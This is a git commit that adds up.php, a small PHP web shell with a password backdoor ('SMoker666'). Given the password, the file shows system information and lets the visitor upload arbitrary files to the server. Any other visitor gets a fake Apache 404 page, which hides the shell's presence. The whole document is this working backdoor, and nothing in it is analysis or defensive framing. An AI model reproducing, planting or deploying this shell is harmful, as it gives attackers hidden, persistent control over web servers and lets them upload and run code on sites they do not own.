18f7b5ef9144d8e8565c2ddb817611fba08aab06
K1LL3rEnd <107191733+K1LL3rEnd@users.noreply.github.com>
2023-06-06 08:39:25 -0400

    Add files via upload

---
+++ up.php
@@ -0,0 +1,22 @@
+<?php 
+error_reporting(E_ERROR | E_PARSE);
+if ($_GET["pass"] == "SMoker666"){
+echo "<b>666 Team</b><br>";
+echo '<b>System Info:</b> '.php_uname();
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+echo '<b>Success!</b><br><br>'; 
+}else { echo 'Failed!</b><br><br>'; }}
+}else{
+$domain = $_SERVER['SERVER_NAME'];
+echo'<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Ubuntu) Server at '.$domain.' Port 443</address>
+</body></html>';}
+?>
